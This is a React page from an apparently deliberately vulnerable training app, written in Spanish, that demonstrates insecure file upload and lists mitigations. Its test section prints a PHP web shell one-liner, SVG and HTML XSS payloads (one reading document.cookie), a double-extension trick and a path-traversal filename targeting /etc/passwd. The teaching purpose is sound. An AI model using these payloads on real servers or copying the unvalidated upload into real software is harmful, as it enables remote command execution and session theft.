import { useState } from 'react';
import { uploadFile } from '../api';

function Upload() {
  const [file, setFile] = useState(null);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [uploading, setUploading] = useState(false);

  const handleFileChange = (e) => {
    setFile(e.target.files[0]);
    setResult(null);
    setError(null);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!file) {
      setError('Debes seleccionar un archivo');
      return;
    }

    setUploading(true);
    setError(null);
    setResult(null);

    try {
      const data = await uploadFile(file);
      setResult(data);
      setFile(null);
      e.target.reset();
    } catch (err) {
      setError(err.message);
    } finally {
      setUploading(false);
    }
  };

  return (
    <div className="page-container">
      <h1 className="page-title">� Subir Archivo - Insecure File Upload</h1>

      <div className="vuln-info">
        <h3>🔓 VULNERABILIDAD: Insecure File Upload</h3>
        <p>
          <strong>Problema:</strong> El backend acepta cualquier tipo de archivo sin 
          validación de extensión, MIME type, ni tamaño. Los archivos se guardan con 
          su nombre original y son accesibles públicamente.
        </p>
        <p>
          <strong>Impacto:</strong> Un atacante puede subir archivos ejecutables maliciosos, 
          web shells, archivos HTML con XSS, o causar DoS con archivos grandes.
        </p>
        <p>
          <strong>Mitigación:</strong> Validar extensión y MIME type, renombrar archivos
        </p>
        <p>
          <strong>Mitigación:</strong> Sanitizar y escapar toda salida HTML usando 
          librerías como DOMPurify, implementar Content-Security-Policy (CSP), 
          y nunca usar <code>dangerouslySetInnerHTML</code> con datos del usuario.
        </p>
      </div>

      <div className="card">
        <h2 className="card-title">Formulario de Subida</h2>
        
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label htmlFor="file">Selecciona un archivo:</label>
            <input
              type="file"
              id="file"
              className="form-control"
              onChange={handleFileChange}
              required
            />
            {file && (
              <p style={{ marginTop: '0.5rem', color: '#666' }}>
                Archivo seleccionado: <strong>{file.name}</strong> 
                ({(file.size / 1024).toFixed(2)} KB)
              </p>
            )}
          </div>

          <button 
            type="submit" 
            className="btn btn-primary" 
            disabled={uploading || !file}
          >
            {uploading ? 'Subiendo...' : 'Subir Archivo'}
          </button>
        </form>

        {result && (
          <div className="result-box result-success">
            <h3>✅ Archivo Subido Exitosamente</h3>
            <p><strong>Nombre:</strong> {result.filename}</p>
            <p><strong>Tamaño:</strong> {(result.size / 1024).toFixed(2)} KB</p>
            <p><strong>MIME Type:</strong> {result.mimetype}</p>
            <p>
              <strong>URL Pública:</strong>{' '}
              <a href={result.url} target="_blank" rel="noopener noreferrer">
                {result.url}
              </a>
            </p>
            
            <div className="alert alert-danger" style={{ marginTop: '1rem' }}>
              <strong>⚠️ ¡Archivo Accesible Públicamente!</strong><br />
              El archivo puede ser accedido por cualquiera desde: {result.url}
            </div>

            <div className="code-block">
              <pre>{JSON.stringify(result, null, 2)}</pre>
            </div>
          </div>
        )}

        {error && (
          <div className="result-box result-error">
            <h3>❌ Error</h3>
            <p>{error}</p>
          </div>
        )}
      </div>

      <div className="card">
        <h2 className="card-title">🧪 Archivos Maliciosos para Probar</h2>
        
        <h3>1. Archivo PHP para Web Shell</h3>
        <div className="code-block">
          <pre>{`Crea un archivo llamado: shell.php
Contenido:
<?php system($_GET['cmd']); ?>

Luego accede:
http://localhost:3000/uploads/shell.php?cmd=ls`}</pre>
        </div>

        <h3>2. Archivo con Doble Extensión</h3>
        <div className="code-block">
          <pre>{`Crea: archivo.php.jpg
Algunos servidores mal configurados ejecutarán el PHP`}</pre>
        </div>

        <h3>3. Archivo SVG con XSS</h3>
        <div className="code-block">
          <pre>{`Crea un archivo: xss.svg
Contenido:
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS via SVG')</script>
</svg>`}</pre>
        </div>

        <h3>4. Archivo HTML con JavaScript</h3>
        <div className="code-block">
          <pre>{`Crea: malicious.html
Contenido:
<html><body>
<script>alert(document.cookie)</script>
</body></html>`}</pre>
        </div>

        <h3>5. Path Traversal en Nombre</h3>
        <div className="code-block">
          <pre>{`Intenta subir un archivo llamado:
../../etc/passwd.txt

(Aunque multer previene esto por defecto, 
servidores mal configurados podrían ser vulnerables)`}</pre>
        </div>
      </div>

      <div className="alert alert-warning">
        <strong>⚠️ Nota de Seguridad:</strong> En producción, SIEMPRE debes:
        <ul>
          <li>✅ Validar el tipo de archivo (MIME type Y extensión)</li>
          <li>✅ Renombrar archivos con nombres aleatorios</li>
          <li>✅ Guardar archivos fuera del directorio público</li>
          <li>✅ Escanear archivos con antivirus</li>
          <li>✅ Limitar el tamaño máximo de archivo</li>
          <li>✅ No ejecutar archivos subidos directamente</li>
        </ul>
      </div>

      <div className="alert alert-info">
        <strong>💡 Ejercicio:</strong> Crea los archivos descritos arriba e intenta 
        subirlos. Observa cómo el servidor los acepta sin validación. Luego intenta 
        acceder a ellos desde el navegador. Investiga cómo implementar validación 
        con librerías como <code>file-type</code> y cómo configurar headers de 
        seguridad como <code>X-Content-Type-Options: nosniff</code>.
      </div>
    </div>
  );
}

export default Upload;
